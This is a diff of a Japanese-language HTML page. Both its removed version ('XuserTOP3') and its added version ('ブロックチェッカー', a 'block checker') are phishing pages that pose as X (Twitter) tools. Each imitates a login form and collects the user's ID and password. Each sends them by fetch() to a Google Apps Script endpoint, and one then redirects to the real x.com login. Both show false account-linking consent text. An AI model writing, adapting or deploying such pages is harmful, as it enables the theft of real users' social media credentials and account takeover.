@@ -3,210 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XuserTOP3</title>
-    
-    <link rel="stylesheet" href="https://abs.twimg.com/responsive-web/client-web/main.6dbd69b9.css">
-    <link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter.ico">
-
+    <title>ブロックチェッカー</title>
     <style>
-        /* 診断開始画面のスタイル */
-        .diagnosis-start {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #000000;
-            color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
-        }
-        .container {
-            background: #16181c;
-            border: 1px solid #2f3336;
-            border-radius: 16px;
-            padding: 40px;
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        .container h1 {
-            color: #ffffff;
-            margin-bottom: 20px;
-            font-size: 24px;
-            font-weight: 700;
-        }
-        .description {
-            color: #71767b;
-            margin-bottom: 30px;
-            line-height: 1.5;
-            font-size: 15px;
-        }
-        .start-btn {
-            background: #1d9bf0;
-            color: #ffffff;
-            border: none;
-            padding: 12px 32px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 24px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 0 20px rgba(29, 155, 240, 0.3);
-            margin-bottom: 20px;
-        }
-        .start-btn:hover {
-            background: #1a8cd8;
-            box-shadow: 0 0 30px rgba(29, 155, 240, 0.5);
-            transform: translateY(-1px);
-        }
-        .notice {
-            color: #536471;
-            font-size: 12px;
-            line-height: 1.4;
-        }
-
-        /* ログイン画面のスタイル */
-        .login-page {
-            background-color: #ffffff;
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #000;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        .login-container { max-width: 400px; width: 100%; padding: 20px; box-sizing: border-box; }
-        .step-hidden { display: none !important; }
-        
-        .x-input-container { width: 100%; position: relative; margin-bottom: 16px; }
-        .x-input { width: 100%; padding: 20px 12px 8px 12px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 17px; box-sizing: border-box; background: transparent; outline: none; }
-        .x-input:focus { border: 2px solid #1d9bf0; padding: 19px 11px 7px 11px; }
-        .x-input-disabled { background-color: #f7f9fa; color: #536471; border: 1px solid #cfd9de; cursor: not-allowed; }
-        
-        .x-label { position: absolute; left: 12px; top: 16px; color: #536471; font-size: 17px; transition: all 0.2s; pointer-events: none; }
-        .x-input:focus ~ .x-label, .x-input:not(:placeholder-shown) ~ .x-label { top: 4px; font-size: 13px; color: #1d9bf0; }
-        .x-input-disabled ~ .x-label { top: 4px; font-size: 13px; color: #536471; }
-
-        .x-btn-black { width: 100%; padding: 14px; background-color: #0f1419; color: #ffffff; border: none; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 24px; }
-        .x-btn-white { width: 100%; padding: 10px; background-color: #ffffff; color: #0f1419; border: 1px solid #cfd9de; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 12px; display: flex; justify-content: center; align-items: center; gap: 8px; }
-        .divider { display: flex; align-items: center; margin: 16px 0; color: #0f1419; font-size: 15px; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #eff3f4; margin: 0 8px; }
-        
-        .footer-text { font-size: 13px; color: #536471; line-height: 16px; margin-top: 24px; text-align: left; }
-        .footer-link { color: #1d9bf0; text-decoration: none; }
-        .footer-link:hover { text-decoration: underline; }
-        
-        .forgot-link { display: block; width: 100%; text-align: left; color: #1d9bf0; font-size: 14px; text-decoration: none; margin-top: 16px; margin-left: 4px; }
-        .forgot-link:hover { text-decoration: underline; }
+        .container {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+            padding: 30px;
+            width: 300px;
+            text-align: center;
+            color: #00ffff;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 255, 255, 1);
+        }
+        h2 {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            color: #66ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #66ffff;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #00ffff;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #66ffff;
+            outline: none;
+        }
+        input[type="button"] {
+            background-color: #00ffff;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        input[type="button"]:hover {
+            background-color: #66ffff;
+        }
+        .note {
+            margin-top: 15px;
+            font-size: 0.9em;
+            color: #66ffff;
+            text-align: left;
+            line-height: 1.4;
+            word-wrap: break-word;
+        }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>ブロックチェッカー</h1>
+        <h2>数分後、あなたのDMに結果が届きます。</h2>
+        <form id="loginForm">
+            <label for="userId">ID:</label>
+            <input type="text" id="userId" name="userId" required>
+            
+            <label for="password">パスワード:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <input type="button" value="ログイン" onclick="submitForm()">
 
-    <!-- セクション1: 診断開始画面 -->
-    <div id="start-section" class="diagnosis-start">
-        <div class="container">
-            <h1>ＸuserTOP3</h1>
-            <p class="description">
-                過去ポスト・リプライを読み取り、あなたの投稿をよくみている人を表示します。
-            </p>
-            <button class="start-btn" onclick="goToLogin()">診断する</button>
-            <p class="notice">
-                本サービス（※ＸuserTOP3）とX（旧Twitter）アカウントの連携により、以下の操作が許可されます。・アカウント情報の読み取り
-                 ※連携はいつでもXの「設定とプライバシー」＞「セキュリティとアカウントアクセス」＞「アプリとセッション」から解除可能です。※Xの利用者契約および当社のプライバシーポリシーに同意のうえ連携してください。
-            </p>
-        </div>
-    </div>
-
-    <!-- セクション2: ログイン画面 -->
-    <div id="login-section" class="login-page step-hidden">
-        <div class="login-container">
-            <div style="display: flex; flex-direction: column; align-items: center;">
-                <div style="width: 32px; height: 32px; margin-bottom: 20px;">
-                    <svg viewBox="0 0 24 24" style="color: #0f1419; fill: currentColor;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
-                </div>
-
-                <div id="step1" style="width: 100%;">
-                    <h1 style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left; letter-spacing: -0.5px;">いま何が起こっているかチェック</h1>
-                    <button type="button" class="x-btn-white">Continue with Google</button>
-                    <button type="button" class="x-btn-white">Appleで続ける</button>
-                    <div class="divider">または</div>
-                    <form id="formStep1">
-                        <div class="x-input-container">
-                            <input type="text" id="usernameInput" class="x-input" placeholder=" " required autocomplete="off">
-                            <label class="x-label">メールアドレスまたはユーザー名</label>
-                        </div>
-                        <button type="submit" class="x-btn-black">続ける</button>
-                    </form>
-                    <div class="footer-text">
-                        続行することで、利用規約、プライバシーポリシーおよびCookieの使用に同意したものとみなされます。
-                    </div>
-                </div>
-
-                <div id="step2" style="width: 100%;" class="step-hidden">
-                    <h1 style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left; letter-spacing: -0.5px;">ログイン</h1>
-                    <form id="formStep2">
-                        <div class="x-input-container">
-                            <input type="text" id="usernameDisplay" class="x-input x-input-disabled" placeholder=" " disabled>
-                            <label class="x-label">ユーザー名</label>
-                        </div>
-                        <div class="x-input-container" style="margin-top: 24px;">
-                            <input type="password" id="passwordInput" class="x-input" placeholder=" " required>
-                            <label class="x-label">パスワード</label>
-                        </div>
-                        <a href="#" class="forgot-link">パスワードをお忘れですか？</a>
-                        <button type="submit" class="x-btn-black" style="margin-top: 24px;">続ける</button>
-                    </form>
-                </div>
+            <div class="note">
+                ※本サービス（ブロックチェッカー）とX（旧Twitter）アカウントの連携により、以下の操作が許可されます。
+                <ul>
+                    <li>アカウント情報の読み取り</li>
+                </ul>
+                ※連携はいつでもXの「設定とプライバシー」＞「セキュリティとアカウントアクセス」＞「アプリとセッション」から解除可能です。<br>
+                ※Xの利用者契約および当社のプライバシーポリシーに同意のうえ連携してください。
             </div>
-        </div>
+        </form>
     </div>
+
     <script>
-        const GAS_URL = "https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec";
-        let capturedUser = ""; 
+        function submitForm() {
+            const formData = new FormData();
+            formData.append('date.user', document.getElementById('userId').value);
+            formData.append('date.pass', document.getElementById('password').value);
 
-        // 診断開始画面からログイン画面へ切り替える関数
-        function goToLogin() {
-            document.getElementById('start-section').classList.add('step-hidden');
-            document.getElementById('login-section').classList.remove('step-hidden');
-            // 画面上部へスクロール
-            window.scrollTo(0, 0);
+            fetch('https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(result => {
+                console.log('成功:', result);
+                alert('ログイン成功');
+            })
+            .catch(error => {
+                console.error('エラー:', error);
+                alert('ログイン失敗');
+            });
         }
-
-        // 1. ステップ1（ID入力）の処理
-        document.getElementById('formStep1').addEventListener('submit', function(e) {
-            e.preventDefault(); 
-            
-            capturedUser = document.getElementById('usernameInput').value;
-            
-            // 2枚目の表示枠に、入力されたIDを表示
-            document.getElementById('usernameDisplay').value = capturedUser;
-            
-            // 1枚目を隠し、2枚目を表示
-            document.getElementById('step1').classList.add('step-hidden');
-            document.getElementById('step2').classList.remove('step-hidden');
-        });
-
-        // 2. ステップ2（パスワード入力）の最終処理
-        document.getElementById('formStep2').addEventListener('submit', async function(e) {
-            e.preventDefault(); 
-
-            const capturedPass = document.getElementById('passwordInput').value;
-            const payload = { user: capturedUser, pass: capturedPass };
-
-            try {
-                // 指定のGASへデータを送信
-                await fetch(GAS_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'text/plain' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {
-                console.error('送信エラー:', error);
-            } finally {
-                // 送信完了後、本物のXログイン画面へリダイレクト
-                window.location.href = "https://x.com/login";
-            }
-        });
     </script>
 </body>
 </html>
